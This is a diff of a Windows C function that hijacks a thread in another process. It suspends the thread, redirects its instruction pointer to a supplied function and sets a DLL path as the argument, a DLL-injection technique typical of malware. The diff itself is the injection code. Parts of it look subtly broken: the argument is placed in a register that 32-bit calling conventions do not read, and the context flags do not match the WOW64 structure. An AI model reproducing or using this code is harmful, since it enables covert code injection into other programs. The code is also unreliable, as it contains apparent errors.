@@ -2,28 +2,32 @@
 #include "windows.h"
 #include "stdio.h"
 
-BOOL HijackTargetThread(IN HANDLE hThread, IN PVOID pStartAddress) {
+BOOL HijackTargetThread(IN HANDLE hThread, IN PVOID pFunctionAddress, IN PVOID pArgument) {
 
-	CONTEXT	ThreadCtx = {};
+	WOW64_CONTEXT ThreadCtx = {};
 	ThreadCtx.ContextFlags = CONTEXT_CONTROL | CONTEXT_SEGMENTS | CONTEXT_INTEGER;
 
-	if (!hThread || !pStartAddress)
+	if (!hThread || !pFunctionAddress || !pArgument)
 		return FALSE;
 
-	if (SuspendThread(hThread) == ((DWORD)-1)) {
+	if (Wow64SuspendThread(hThread) == ((DWORD)-1)) {
 		printf("[!] SuspendThread Failed With Error: %d \n", GetLastError());
+		ResumeThread(hThread);
 		return FALSE;
 	}
 
-	if (!GetThreadContext(hThread, &ThreadCtx)) {
+	if (!Wow64GetThreadContext(hThread, &ThreadCtx)) {
 		printf("[!] GetThreadContext Failed With Error: %d \n", GetLastError());
+		ResumeThread(hThread);
 		return FALSE;
 	}
 
-	ThreadCtx.Ecx = (DWORD64) pStartAddress;
+	ThreadCtx.Eip = (DWORD)(DWORD_PTR)pFunctionAddress;
+	ThreadCtx.Eax = (DWORD)(DWORD_PTR)pArgument; // DLL path as parameter
 
-	if (!SetThreadContext(hThread, &ThreadCtx)) {
+	if (!Wow64SetThreadContext(hThread, &ThreadCtx)) {
 		printf("[!] SetThreadContext Failed With Error: %d \n", GetLastError());
+		ResumeThread(hThread);
 		return FALSE;
 	}
 
